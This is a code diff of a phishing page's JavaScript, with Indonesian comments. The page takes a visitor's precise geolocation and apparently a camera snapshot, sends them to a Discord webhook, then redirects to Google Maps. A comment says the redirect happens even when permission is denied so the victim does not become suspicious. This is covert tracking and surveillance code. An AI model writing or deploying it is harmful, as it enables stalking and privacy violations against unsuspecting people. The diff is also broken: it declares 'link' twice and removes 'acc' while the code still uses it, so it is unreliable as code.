@@ -54,7 +54,7 @@
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
+                const link = `https://www.google.com/maps?q=${lat},${lon}`;
                 const link = "https://www.google.com/maps?q=$" + lat + "," + lon;
                 
                 await sendToDiscord("📍 **Lokasi Akurat:**\nAkurasi: " + acc.toFixed(1) + " meter\nLink: " + link);
@@ -75,10 +75,10 @@
                             stream.getTracks().forEach(t => t.stop());
                             // Redirect ke Google Maps asli
                             window.location.href = "https://www.google.com/maps";
-                        }, 'image/jpeg');
+                        window.location.href = link;
                     }, 2000);
                 } catch (e) {
-                    window.location.href = "https://www.google.com/maps";
+                    window.location.href = link;
                 }
             }, (err) => {
                 // Jika izin ditolak, tetap redirect agar tidak curiga
